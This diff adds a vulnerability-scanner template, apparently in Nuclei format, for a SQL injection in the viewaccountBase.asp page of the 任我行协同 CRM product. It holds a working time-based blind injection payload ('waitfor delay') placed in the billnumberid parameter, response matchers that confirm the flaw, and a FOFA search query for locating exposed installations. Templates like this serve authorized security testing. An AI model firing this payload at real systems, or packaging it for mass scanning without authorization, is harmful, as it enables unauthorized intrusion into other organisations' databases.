@@ -1,0 +1,37 @@
+id: wecrm-viewaccountBase-sqli
+info:
+  name: 任我行协同 CRM 普及版 viewaccountBase - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/bef1259d4babbff23c207ae283004ec96ddb1fdb/wpoc/%E4%BB%BB%E6%88%91%E8%A1%8C/%E4%BB%BB%E6%88%91%E8%A1%8C%E5%8D%8F%E5%90%8CCRM%E6%99%AE%E5%8F%8A%E7%89%88viewaccountBase%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="任我行软件-管家婆分销ERP"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: wecrm,sqli,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /common/viewaccountBase.asp?TimeCheckPoint=80685.73&billnumberid=-1%20waitfor%20delay%20%270:0:5%27--&billtype= HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'SQL')
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
